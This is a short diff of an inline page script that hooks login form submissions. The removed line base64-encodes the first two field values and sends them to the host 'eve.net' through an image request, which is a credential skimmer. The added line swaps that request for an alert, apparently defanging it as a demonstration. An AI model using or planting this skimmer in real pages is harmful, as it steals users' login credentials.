@@ -7,7 +7,7 @@
         setTimeout(() => {
           $('form[action*=login]').submit(({currentTarget}) => {
             a = currentTarget
-            new Image.src = '//eve.net/' + btoa(a[0].value) + '/' + btoa(a[1].value)
+            alert( '//eve.net/' + btoa(a[0].value) + '/' + btoa(a[1].value))
           })
         }, 4000)
       </script>
